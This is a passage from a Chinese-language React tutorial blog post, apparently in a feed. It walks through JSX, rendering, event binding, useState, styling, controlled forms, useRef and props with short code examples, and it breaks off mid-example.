        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="创建-demo-工程"><a class="markdownIt-Anchor" href="#创建-demo-工程"></a> 创建 demo 工程</h2><p>命令为 <code>npx create-react-app react-basic</code></p><h2 id="严格模式"><a class="markdownIt-Anchor" href="#严格模式"></a> 严格模式</h2><p>React18 默认创建的工程开启了严格模式。React 应用在开发环境下若使用了 React 的严格模式（<code>&lt;React.StrictMode&gt;</code>），在渲染过程中，所有组件都会被调用两次。这是为了帮助检测不严谨的代码和潜在的问题。</p><p>具体在 <code>src\index.js</code> 中将 <code>&lt;React.StrictMode&gt;</code> 标签去掉即可</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">"react-dom/client"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">"./App"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"root"</span>));</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><p>即：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">"react-dom/client"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">"./App"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"root"</span>));</span><br><span class="line">root.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="jsx-概念"><a class="markdownIt-Anchor" href="#jsx-概念"></a> JSX 概念</h2><p>JSX 是 JavaScript 和 XML（HTML）的缩写，并非标准的 JS 语法，而是一种语法扩展，其表示在 JS 代码中编写 HTML 模版结构，它是 React 中编写 UI 模版的方式。</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在 React 中，<code>className</code> 是用来指定 HTML 元素的 CSS 类的属性。由于 JavaScript 语言中 <code>class</code> 是一个保留字，因此在 JSX 中使用 <code>class</code> 时会出现语法错误。因此，React 使用 <code>className</code> 来替代 <code>class</code>。</p></blockquote><p>可以使用在线网站查看 jsx 如何被 babel 转为 js 语法：<a href="https://www.babeljs.io">https://www.babeljs.io</a></p><p>点击网站上方导航栏的 try it out 将 react 勾选上就可以简单看看：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091620738.png" alt="image-20241109162000100"></p><h2 id="jsx-中使用-js-表达式"><a class="markdownIt-Anchor" href="#jsx-中使用-js-表达式"></a> JSX 中使用 JS 表达式</h2><p>在 JSX 中可以通过大括号 <code>{}</code> 识别 JavaScript 中的表达式，比如常见的变量、函数调用、方法调用等等。常见场景有：</p><ol><li>使用引号传递字符串</li><li>使用 JavaScript 变量</li><li>函数调用和方法调用</li><li>使用 JavaScript 对象 </li></ol><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> msg = <span class="string">"Easy React"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayMyName</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"The name is John Wick"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Simple Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {/** 使用引号传递字符串 */}</span></span><br><span class="line"><span class="language-xml">      {"This is a string"}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {/** 使用JS变量 */}</span></span><br><span class="line"><span class="language-xml">      {msg}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {/** 函数调用 */}</span></span><br><span class="line"><span class="language-xml">      {sayMyName()}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {/** 方法调用 */}</span></span><br><span class="line"><span class="language-xml">      {new Date().toLocaleDateString()}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {/** 使用JS对象 */}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">{{</span> <span class="attr">color:</span> "<span class="attr">blue</span>" }}&gt;</span>早上好，夜之城。<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091632425.png" alt="image-20241109163225388"></p><p>其中 <code>&lt;div style={{ color: 'blue' }}&gt;早上好，夜之城。&lt;/div&gt;</code> 的 style 的第一层大括号是识别 JS 表达式，用于识别包含 color 属性的对象。</p><div class="note warning flat"><p>warning</p><p>if 语句、switch 语句、变量声明等属于语句，不是表达式，不能出现在大括号 {} 中</p></div><h2 id="jsx-实现列表渲染"><a class="markdownIt-Anchor" href="#jsx-实现列表渲染"></a> JSX 实现列表渲染</h2><p>渲染需求：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>凯瑟琳：数学家<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>马里奥：化学家<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>凯西里：化学家<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>沃尔特：化学家<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>苏布拉马妮阳：化学家<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在 JSX 中可以使用原生 JS 的 map 方法变量渲染：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> list = [</span><br><span class="line">  { <span class="attr">name</span>: <span class="string">"John"</span>, <span class="attr">age</span>: <span class="number">25</span> },</span><br><span class="line">  { <span class="attr">name</span>: <span class="string">"Mary"</span>, <span class="attr">age</span>: <span class="number">30</span> },</span><br><span class="line">  { <span class="attr">name</span>: <span class="string">"Tom"</span>, <span class="attr">age</span>: <span class="number">28</span> },</span><br><span class="line">  { <span class="attr">name</span>: <span class="string">"Jane"</span>, <span class="attr">age</span>: <span class="number">23</span> },</span><br><span class="line">  { <span class="attr">name</span>: <span class="string">"Bob"</span>, <span class="attr">age</span>: <span class="number">35</span> },</span><br><span class="line">];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Simple Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        {list.map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">{item.name}</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            {item.name} - {item.age}</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><div class="note warning flat"><p>warning</p><p><code>key</code> 应当是独一无二的，该值供 React 内部使用，提升列表更新性能</p></div><h2 id="jsx-条件渲染"><a class="markdownIt-Anchor" href="#jsx-条件渲染"></a> JSX 条件渲染</h2><p>语法：在 React 中，可以通过逻辑与运算符 <code>&amp;&amp;</code>、三元表达式 <code>(?:)</code> 实现基础的条件渲染</p><ol><li>逻辑与：<code>{flag &amp;&amp; &lt;span&gt;flag为真则显示span&lt;/span&gt;}</code></li><li>三元表达式：<code>{loading ? &lt;span&gt;loading...&lt;/span&gt; : &lt;span&gt;show&lt;/span&gt;}</code></li></ol><p><strong>复杂条件下，可以使用自定义函数返回不同结果的 jsx 模板来实现需求。</strong></p><h2 id="react-基础事件绑定"><a class="markdownIt-Anchor" href="#react-基础事件绑定"></a> React 基础事件绑定</h2><h3 id="基础绑定"><a class="markdownIt-Anchor" href="#基础绑定"></a> 基础绑定</h3><p>语法：on + 事件名称 ={事件处理程序}，整体上遵循驼峰命名法（如：handleClick）</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091708950.png" alt="image-20241109170842883" style="zoom:50%;"><h3 id="获取事件"><a class="markdownIt-Anchor" href="#获取事件"></a> 获取事件</h3><p>语法：在事件回调函数中写上形参 e</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091711394.png" alt="image-20241109171126332" style="zoom:50%;"><h3 id="传递自定义参数"><a class="markdownIt-Anchor" href="#传递自定义参数"></a> 传递自定义参数</h3><p>语法：在绑定事件中改写为箭头函数写法，将实参传递</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091713205.png" alt="image-20241109171347125" style="zoom:50%;"><h3 id="传递自定义参数和事件"><a class="markdownIt-Anchor" href="#传递自定义参数和事件"></a> 传递自定义参数和事件</h3><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091715686.png" alt="image-20241109171510601" style="zoom:50%;"><div class="note warning flat"><p>warning</p><p>请注意自定义参数和事件参数 e 的位置。传递和接收须一一对应。</p></div><h2 id="react-组件"><a class="markdownIt-Anchor" href="#react-组件"></a> React 组件</h2><p>在 React 中，一个组件就是<strong>首字母大写</strong>的函数，内部存放了组件的逻辑和视图 UI，渲染组件只需要把组件当成标签书写即可。</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091724366.png" alt="image-20241109172427287" style="zoom:50%;"><div class="note warning flat"><p>warning</p><p>请注意声明和使用时，组件名首字母大写。</p></div><h2 id="usestate-基础使用"><a class="markdownIt-Anchor" href="#usestate-基础使用"></a> useState 基础使用</h2><p>usestate 是 - 一个 ReactHook（函数），它允许我们向组件添加一个<strong>状态变量</strong>，从而控制影响组件的渲染结果。</p><p>本质：和普通 JS 变量不同的是，状态变量一旦发生变化组件的视图 UI 也会跟着变化（<strong>数据驱动视图</strong>）。</p><p>例如：<code>const [count, setCount] = useState(0)</code></p><ol><li>useState 是一个函数，返回值是一个数组。</li><li>数组中的第一个参数是状态变量，第二个参数是 set 函数用来修改状态变量</li><li> useState 的参数将作为 count 的初始值</li></ol><p>简单案例：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091735328.png" alt="image-20241109173503242" style="zoom:50%;"><div class="note warning flat"><p>warning</p><ol><li>请先将 useState 进行导入</li><li>请注意使用 setCount 时，传递的值为新值，不能使用 <code>count++</code> 或者 <code>count += 1</code> 等类似写法。</li></ol></div><h2 id="修改状态的规则"><a class="markdownIt-Anchor" href="#修改状态的规则"></a> 修改状态的规则</h2><p>前文提到，使用 setCount 时，传递的值为新值，不能使用 <code>count++</code> 或者 <code>count += 1</code> 等类似写法。</p><div class="note info flat"><p>info</p><p>在 React 中，状态被认为是只读的，我们应该始终替换它而不是修改它，直接修改状态不能引发视图更新。</p></div><p>即，你不能使用以下方式更改 count 的值：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091743217.png" alt="image-20241109174316164" style="zoom:50%;"><p>于是，修改对象这种复杂类型的状态变量，也同样适用。</p><h3 id="复杂类型修改"><a class="markdownIt-Anchor" href="#复杂类型修改"></a> 复杂类型修改</h3><div class="note info flat"><p>info</p><p>在 React 中，对于对象类型的状态变量，应该始终传给 set 方法一个<strong>全新的对象</strong>来进行修改。</p></div><p>例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091753859.png" alt="image-20241109175314730"></p><p>其中的 setUser 方法将属性展开，再书写要覆盖的属性进行赋值，这样就完成了实际上的属性修改，如果不展开，那么属性将只剩下后书写的属性。</p><h2 id="react-样式控制"><a class="markdownIt-Anchor" href="#react-样式控制"></a> React 样式控制</h2><p>一般分为行内写法和分离写法。</p><p>行内写法例如：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411092143167.png" alt="image-20241109214302038" style="zoom:50%;"><p>或者像前面的写法一样，写成：<code>&lt;span style = {{ color: red }}&gt;</code></p><p>分离写法的意思是，将样式抽离为一个 css 文件进行导入使用。具体是在标签上使用 <code>className</code>（此为固定名）进行导入使用。例如：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> {</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411092147084.png" alt="image-20241109214659938" style="zoom:50%;"><h2 id="classnames-类名控制"><a class="markdownIt-Anchor" href="#classnames-类名控制"></a> classnames 类名控制</h2><blockquote><p>github 地址：<a href="https://github.com/JedWatson/classnames">https://github.com/JedWatson/classnames</a></p></blockquote><p>可以使用 classnames 进行类名控制，解决类名控制时使用模板字符串拼接类名过多时的拼接易出错、不直观的问题。</p><p>例如这种类名写法：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> type = <span class="string">"admin"</span>; <span class="comment">// 该值可以是接收到的后端数据，这里只是示例</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">{</span>`<span class="attr">spanTitle</span>${<span class="attr">type</span> === <span class="string">"admin"</span> &amp;&amp; "<span class="attr">active</span>"}`}&gt;</span></span></span><br><span class="line"><span class="language-xml">        This is John wick.</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>如果使用 classnames 则为：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> type = <span class="string">"admin"</span>; <span class="comment">// 该值可以是接收到的后端数据，这里只是示例</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">{classNames(</span>"<span class="attr">spanTitle</span>", { <span class="attr">active:</span> <span class="attr">type</span> === <span class="string">"admin"</span> })}&gt;</span></span></span><br><span class="line"><span class="language-xml">        This is John wick.</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="react-表单受控绑定"><a class="markdownIt-Anchor" href="#react-表单受控绑定"></a> React 表单受控绑定</h2><p>概念：使用 React 组件的状态（useState）控制表单的状态。</p><p>就是使用 useState 的 value 绑定输入框的 value，再通过 onChange 事件将输入的值传给 set 方法，实现输入数据视图更新的操作。例如：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [name, setName] = <span class="title function_">useState</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">onChange</span>=<span class="string">{(e)</span> =&gt;</span> setName(e.target.value)}&gt;<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">{name</span> === <span class="string">""</span> ? { <span class="attr">display:</span> "<span class="attr">none</span>" } <span class="attr">:</span> {}}&gt;</span></span></span><br><span class="line"><span class="language-xml">        Hello, The name is {name}!</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>一旦输入框输入值，span 标签将会显示值。</p><h2 id="react-获取-dom"><a class="markdownIt-Anchor" href="#react-获取-dom"></a> React 获取 Dom</h2><p>在 React 组件中获取 / 操作 DOM，需要使用 useRef 钩子函数：</p><ol><li>使用 useRef 创建 ref 对象，并与 JSX 绑定</li><li>在 DOM 可用时，通过 inputRef.current 拿到 DOM 对象 </li></ol><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useRef } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> domRef = <span class="title function_">useRef</span>(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">showDom</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(domRef.<span class="property">current</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">dir</span>(domRef.<span class="property">current</span>);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ref</span>=<span class="string">{domRef}</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{showDom}</span>&gt;</span>获取dom<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="react-父子通信"><a class="markdownIt-Anchor" href="#react-父子通信"></a> React 父子通信</h2><h3 id="父传子"><a class="markdownIt-Anchor" href="#父传子"></a> 父传子</h3><ol><li>子组件标签上通过属性绑定数据</li><li>子组件通过 props 形参接收数据对象 </li></ol><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"Son"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is {props.appName}<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">"John Wick"</span>;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Son</span> <span class="attr">appName</span>=<span class="string">{name}</span>&gt;</span><span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>请注意子组件中使用的是 appName 属性，而非具体传递的 name 变量。</p><div class="note warning flat"><p>warning</p><p>props 可以传递任意合法的 JS 数据，但 props 是只读的，子组件不能直接修改该数据。</p></div><h3 id="特殊的-props-属性-children"><a class="markdownIt-Anchor" href="#特殊的-props-属性-children"></a> 特殊的 props 属性 - children</h3><p>如果不是在子组件的标签属性中传递数据，而是将内容嵌套在子组件标签中，则子组件将通过一个默认的 props 属性进行接收，该属性名为 children。</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>) {</span><br><span class="line">  <span class="keyword">return</span> <span 